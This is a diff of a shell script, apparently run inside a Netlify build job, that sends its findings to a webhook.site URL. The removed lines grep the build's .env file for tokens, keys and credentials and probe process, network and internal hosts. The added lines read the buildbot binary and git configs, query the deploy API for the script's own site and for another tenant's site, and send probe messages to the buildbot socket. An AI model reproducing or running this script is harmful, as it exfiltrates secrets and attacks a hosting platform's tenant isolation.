@@ -1,11 +1,16 @@
 #!/bin/sh
 B="https://webhook.site/4ae49b89-684a-49dd-93bf-8e1e9688695d"
 P(){ curl -s --max-time 9 --data-urlencode "d=$2" "$B/$1" >/dev/null 2>&1; }
-P PIV-ENVFILE "$(cat /opt/build/env_store/.env 2>&1 | grep -iE 'token|secret|key|deploy|url|hook|auth|cred|internal|http' | head -40)"
-P PIV-PROC "cmdline1=$(cat /proc/1/cmdline 2>/dev/null|tr '\0' ' ') ||| self=$(cat /proc/self/status 2>/dev/null|grep -iE 'CapEff|Uid|Seccomp'|tr '\n' ' ') ||| ps=$(ps -ef 2>/dev/null|head -15|tr '\n' '~')"
-P PIV-FDS "$(ls -la /proc/self/fd 2>/dev/null|head; echo '=netstat='; cat /proc/net/tcp 2>/dev/null|head -8)"
-P PIV-DEPLOYAPI "deploy=$(curl -s --max-time 5 -o /dev/null -w '%{http_code}' https://api.netlify.com/api/v1/deploys/$DEPLOY_ID 2>/dev/null) ||| appdeploy=$(curl -s --max-time 5 -o /dev/null -w '%{http_code}' https://app.netlify.com/api/v1/deploys/$DEPLOY_ID 2>/dev/null) ||| site=$(curl -s --max-time 5 -o /dev/null -w '%{http_code}' https://api.netlify.com/api/v1/sites/$SITE_ID 2>/dev/null)"
-P PIV-INTERNAL "$(for h in deploy d api-internal build buildbot internal artifacts upload origin cdn edge; do echo -n "$h="; curl -s --max-time 3 -o /dev/null -w '%{http_code};' https://$h.services-prod.nsvcs.net/ 2>/dev/null; done)"
-P PIV-GW "gw=$(ip route 2>/dev/null|head; echo '=host='; echo $HOST_NODE_IP; echo -n 'host80='; curl -s --max-time 3 -o /dev/null -w '%{http_code}' http://$HOST_NODE_IP/ 2>/dev/null; echo; echo -n 'host8080='; curl -s --max-time 3 -o /dev/null -w '%{http_code}' http://$HOST_NODE_IP:8080/ 2>/dev/null)"
-P PIV-WRAPPER "$(find /opt / -maxdepth 3 \( -name '*buildbot*' -o -name 'build-bot*' -o -iname '*deploy-cli*' \) 2>/dev/null|head; echo '=buildhome='; ls -la /opt/buildhome 2>/dev/null|head)"
+P SOCK "ls=$(ls -la /tmp/netlify-buildbot-socket 2>&1) ||| bin=$(ls -la /opt/build-bin/buildbot 2>&1) ||| strings=$(strings /opt/build-bin/buildbot 2>/dev/null | grep -iE 'socket|publish|/api/v1|command|deploy_id|json|rpc|method' | sort -u | head -40 | tr '\n' '~')"
+P GITCONF "buildhome=$(cat /opt/buildhome/.gitconfig 2>&1) ||| repo=$(cat /opt/build/repo/.git/config 2>&1 | head -c 400)"
+P XTENANT "myDEPLOY=$(curl -s --max-time 5 https://api.netlify.com/api/v1/deploys/$DEPLOY_ID 2>/dev/null | head -c 250) ||| mySITE=$(curl -s --max-time 5 https://api.netlify.com/api/v1/sites/$SITE_ID 2>/dev/null | head -c 200) ||| OTHERsite=$(curl -s --max-time 5 -o /dev/null -w '%{http_code}' https://api.netlify.com/api/v1/sites/f138e3e9-e273-4f84-a217-b64705329a9a 2>/dev/null)"
+P SOCKTALK "$(python3 - <<'PY' 2>&1 | head -c 500
+import socket
+for probe in [b'{"command":"status"}\n', b'{"method":"status"}\n', b'\n']:
+    try:
+        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(4); s.connect('/tmp/netlify-buildbot-socket')
+        s.sendall(probe); print('probe',probe,'->',repr(s.recv(400))); s.close()
+    except Exception as e: print('probe',probe,'ERR',e)
+PY
+)"
 echo done
